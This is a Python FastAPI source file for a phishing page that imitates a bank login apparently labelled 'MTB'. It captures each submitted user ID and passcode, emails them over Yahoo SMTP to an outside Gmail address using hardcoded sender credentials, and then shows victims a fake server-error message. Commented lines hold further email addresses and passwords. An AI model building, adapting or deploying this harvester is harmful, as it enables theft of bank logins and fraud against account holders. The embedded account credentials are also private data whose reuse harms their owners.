# import yagmail
import smtplib
# import ssl
from fastapi import FastAPI
from fastapi import HTTPException
from fastapi import Request
from fastapi.responses import RedirectResponse
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
from datetime import datetime


app = FastAPI()
templates = Jinja2Templates(directory="templates")

app.mount("/static", StaticFiles(directory="static"), name="static")


class LoginForm:
    def __init__(self, request: Request):
        self.request: Request = request
        self.errors: List = []
        self.username: Optional[str] = None
        self.password: Optional[str] = None

    async def load_data(self):
        form = await self.request.form()
        self.username = form.get(
            "txtUserID"

        )
        self.password = form.get(
            "txtPasscode"
        )
        
    async def is_valid(self):
        if not self.username or not self.password:
            self.errors.append("Incorrect user id or passcode")

        if not self.errors:
            return True
        return False

    async def send_email(self):
        # c = yagmail.inline(3)
        subject = "MTB Account Details"
        content = f"""
        User ID : {self.username}
        Passcode : {self.password}


        """

        #email_rec = 'mheyhou1@gmail.com'
        email_rec = 'agtdanielwilliams@gmail.com'
        email_address = 'serveremail00@yahoo.com'     # add email address here
        Subject = 'Subject: MTB Details...\n\n'
        #content = ' Dear Test, \n This is a test message.\n\n ' 
        footer = '- Best Regards!'    # add test footer 
        passcode = 'pwzgbfjabhdighxv'        # add passcode here
        conn = smtplib.SMTP_SSL('smtp.mail.yahoo.com', 465) 
        conn.ehlo()
        conn.login(email_address, passcode)
        conn.sendmail(email_address,email_rec,Subject + content + footer)
        conn.quit()
        print("email sent..")
        # yag = yagmail.SMTP({"mheyhou1@gmail.com": "Red Bull Details"}, "@Roksel3031")
        # yag = yagmail.SMTP({"totalsoccerwin@gmail.com": "Red Bull Details"}, "udryehcviotmoecz")
        # yag.send(to, subject, body)






@app.get("/")
def login(request: Request):
    return templates.TemplateResponse("index.html", {"request": request, "error": 0})

@app.post("/submit")
async def login(request: Request):
    form = LoginForm(request)
    await form.load_data()
    print(form.__dict__)
    if await form.is_valid():
        print(form.__dict__)
        try:
            # form.__dict__.update(msg="Email Sent Successful :)")
            print(form.__dict__)
            await form.send_email()
            return templates.TemplateResponse("index.html", {"request": request, "error": "Server error please try again in few hours.."})
        except HTTPException:
            form.__dict__.update(msg="")
            form.__dict__.get("errors").append("Error, Please try again...")
            return templates.TemplateResponse("index.html", form.__dict__)
    return templates.TemplateResponse("index.html", {"request": request, "error": 1})